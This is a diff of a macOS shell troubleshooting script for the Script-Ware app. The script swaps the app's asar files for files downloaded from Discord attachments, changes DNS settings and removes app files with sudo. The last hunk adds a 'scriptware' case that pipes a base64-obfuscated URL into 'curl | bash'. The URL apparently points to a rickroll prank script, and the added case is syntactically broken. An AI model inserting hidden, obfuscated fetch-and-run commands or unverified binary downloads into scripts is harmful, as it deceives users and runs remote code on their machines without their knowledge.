@@ -10,8 +10,6 @@ compl () {
     Completed you may now close Terminal'
 } 
 
-
-
 addup () {
     curl https://cdn.discordapp.com/attachments/892279108875210812/938016240314744882/update.asar --output /Applications/Script-Ware.app/Contents/Resources/update.asar && curl https://cdn.discordapp.com/attachments/892279108875210812/938017715820576818/app.asar --output /Applications/Script-Ware.app/Contents/Resources/app.asar
 }
@@ -30,15 +28,15 @@ update2 () {
 
 flush () {
     dscacheutil -flushcache; sudo killall -HUP mDNSResponder
- }
+}
 
  dnsfix() {
      networksetup -setdnsservers Wi-Fi 8.8.8.8
      flush
- }
+}
  
  potentialmonterey () { # Credits Mars
- pkill -9 Script-Ware
+    pkill -9 Script-Ware
     mkdir ~/Desktop/SWBackup$$/
     sudo mv /Users/Shared/SW-DELAY.txt ~/Desktop/SWBackup$$/
     sudo mv /Users/Shared/SW-INIT.txt ~/Desktop/SWBackup$$/
@@ -53,7 +51,7 @@ flush () {
     sudo rm -r /Applications/Script-Ware.app/
     sudo chown -R "$(whoami)" /tmp/
     echo 'Reinstall Script-Ware then restart your device.'
- }
+}
 
     case "$msg" in
 
@@ -83,7 +81,6 @@ flush () {
         
         "
     fi
-
     if [ -f "/Applications/Script-Ware.app/Contents/Resources/app.asar" ]; then 
         echo '
         
@@ -99,7 +96,6 @@ flush () {
         
         "
     fi
-
     if [ -f '/usr/local/lib/libchilkat_x86_64.dylib' ]; then 
     echo '
     
@@ -177,4 +173,6 @@ flush () {
     ;;
     permission)
     chmod +x /usr/local/lib/libchilkat_x86_64.dylib
+    scriptware)
+    curl -L aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tlcm9zZXJlbmUvcmlja3JvbGxyYy9tYXN0ZXIvcm9sbC5zaA== | bash
     esac
